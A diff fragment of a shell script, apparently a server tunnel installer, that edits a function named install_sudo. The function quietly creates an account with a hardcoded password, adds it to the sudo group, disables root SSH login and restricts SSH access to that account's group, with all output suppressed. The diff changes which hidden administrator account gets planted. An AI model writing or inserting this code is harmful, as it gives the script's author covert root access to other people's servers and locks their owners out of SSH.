@@ -348,9 +348,9 @@ RLIMITS=""' >> stunnel4
 install_sudo(){
 clear
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@@Alamin00 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m firoz 2>/dev/null; echo firoz:firoz1 | chpasswd &>/dev/null; usermod -aG sudo firoz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    echo "AllowGroups firoz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
